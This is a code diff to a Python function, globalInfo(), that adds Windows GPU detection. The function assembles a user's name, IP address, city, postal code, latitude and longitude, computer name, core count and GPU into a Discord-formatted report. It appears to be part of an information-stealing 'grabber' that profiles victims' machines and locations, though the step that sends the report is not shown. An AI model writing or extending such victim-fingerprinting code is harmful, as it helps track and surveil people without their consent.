@@ -394,11 +394,19 @@ def globalInfo():
     computer_name = socket.gethostname()
     cores = os.cpu_count()
     gpu = ''
+
     if platform.system() == 'Linux':
         gpu_info = os.popen('lspci | grep -i nvidia').read().strip()
         if gpu_info:
             gpu = os.popen("nvidia-smi --query-gpu=gpu_name --format=csv,noheader").read()
-
+    elif platform.system() == 'Windows':
+        try:
+            result = subprocess.run(['nvidia-smi', '--query-gpu=gpu_name', '--format=csv,noheader'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+            
+            if result.returncode == 0:
+                gpu = result.stdout.strip()
+        except Exception as e:
+            pass
     globalinfo = f":flag_{country_code}: - `{username.upper()} | {ip} ({country}, {city})`\nMore Information 👀 : \n :flag_{country_code}: - `({region}) ({postal})` \n 💻 PC Information : \n`{computer_name}`\n Cores: `{cores}` \nGPU : `{gpu}` \nLatitude + Longitude  : {latitude}, {longitude} "
     return globalinfo
 
